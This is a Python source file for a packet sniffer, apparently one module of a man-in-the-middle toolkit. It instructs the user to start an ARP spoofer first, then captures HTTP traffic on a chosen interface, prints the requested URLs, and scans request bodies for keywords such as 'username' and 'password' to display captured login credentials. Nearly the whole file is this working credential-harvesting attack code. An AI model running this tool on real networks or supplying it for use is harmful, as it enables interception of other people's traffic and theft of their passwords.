import time
from colorama import Fore
from colorama import Style

import scapy.all
from scapy.layers import http
import psutil
from prettytable import PrettyTable
import subprocess
import re


# Global variables
choice = "y"


# get the current MAC address
def get_current_mac(interface):
    try:
        # uses the subprocess to the run the input command ifconfig in this case and produce an output
        output = subprocess.check_output(["ifconfig", interface])
        return re.search("\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", str(output)).group(0)
    except:
        pass


# get_current_ip
def get_current_ip (interface):
    output = subprocess.check_output(["ifconfig", interface])
    pattern = re.compile(r'(\d{1,3}\.\d{1,3}\.\d{1,3})')
    output1 = output.decode()
    ip = pattern.search(output1)[0]
    return ip


# for the ip table
def ip_table():
    # get all the interface details in with psutil in a variable
    addrs = psutil.net_if_addrs()
    t = PrettyTable([f'{Fore.GREEN}Interface', 'Mac Address', f'IP Address{Style.RESET_ALL}'])
    for k, v in addrs.items():
        mac = get_current_mac(k)
        ip = get_current_ip(k)
        if ip and mac:
            t.add_row([k,mac,ip])
        elif mac:
            t.add_row([k, mac, ip])
        elif mac:
            t.add_row([k, mac, f"{Fore.YELLOW}No IP assigned{Style.RESET_ALL}"])
        elif ip:
            t.add_row([k,f"{Fore.YELLOW}No Mac assigned{Style.RESET_ALL}", ip])
        print(t)


# Sniff Section
def sniff(interface):
    # scapy.all.sniff(iface=interface, store=False, prn=process_sniffed_packet,filter="port 80")
    scapy.all.sniff(iface=interface, store=False, prn=process_sniffed_packet)


 # function to monitor the packets
def process_sniffed_packet(packet):
    # we chaeck that the packets have the layer http request
    if packet.haslayer(http.HTTPRequest):
        # ig the packet has the http request then we check that it contain the RAW packet
        print("[+] HTTP REQUEST >>>>>")
        url_extractor(packet)
        test = get_login_info(packet)
        # if login in info has been found then print
        if test:
            print(f"{Fore.GREEN}[+] Username OR password is Send >>> ", test ,f"{Style.RESET_ALL}")
        # To Print the raw Packet
        if (choice=="Y" or choice == "y"):
            raw_http_request(packet)


def get_login_info(packet):
    # if it contains the raw file then print that field post request
    if packet.haslayer(scapy.all.Raw):
        load = packet[scapy.all.Raw].load
        load_decode = load.decode()
        keywords = ["username", "user", "email", "pass", "login", "password","UserName", "Password" ]
        for i in keywords:
            if i in load_decode:
                return load_decode


def url_extractor(packet):
    http_layer= packet.getlayer('HTTPRequest').fields
    ip_layer = packet.getlayer('IP').fields
    print(ip_layer["src"] , "just requested \n" , http_layer["Method"].decode(), " ",http_layer["Host"].decode(), " ", http_layer["Path"].decode() )
    return


def raw_http_request(packet):
    httplayer = packet[http.HTTPRequest].fields
    print("------------------***Raw HTTP Packet***------------------")
    print("{:<8} {:<15}".format('Key','Label'))
    try:
        for k, v in httplayer.items():
            try:
                label = v.decode()
            except:
                pass
            print("{:<40} {:<15}".format(k,label))
    except KeyboardInterrupt:
        print("\n[+] Quitting Program...")
    print("---------------------------------------------------------")


# main sniffing function
def main_sniff():
    print(f"{Fore.BLUE}Welcome To Packet Sniffer{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[***] Please Start Arp Spoofer Before Using this Module [***] {Style.RESET_ALL}")
    try:
        global choice
        choice = input("[*] Do you want to print the raw Packet : Y?N : ")
        ip_table()
        interface = input("[*] Please enter the interface name : ")
        print("[*] Sniffing Packets...")
        sniff(interface)
        print(f"{Fore.YELLOW}\n[*] Redirecting to Main Menu...{Style.RESET_ALL}")
        time.sleep(3)
    except KeyboardInterrupt:
        print(f"{Fore.RED}\n[!] Redirecting to Main Menu...{Style.RESET_ALL}")
        time.sleep(3)


if __name__ == "__main__":
    main_sniff()
